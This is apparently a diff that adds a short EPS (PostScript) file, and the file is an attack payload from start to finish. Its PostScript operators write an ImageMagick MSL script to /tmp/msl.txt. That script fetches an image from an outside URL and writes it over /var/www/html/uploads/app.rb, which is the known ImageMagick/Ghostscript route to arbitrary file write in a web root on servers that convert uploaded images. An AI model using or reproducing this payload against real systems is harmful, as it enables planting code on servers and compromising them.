@@ -1,0 +1,7 @@
+%!PS-Adobe-2.0 EPSF-1.2
+/outf (/tmp/msl.txt) (w) file def
+outf (<?xml version="1.0" encoding="UTF-8"?><image><read filename='https://http.cat/images/200.jpg'/><write filename='rgb:/var/www/html/uploads/app.rb' /></image>) writestring
+outf closefile 
+showpage
+quit
+%%EOF
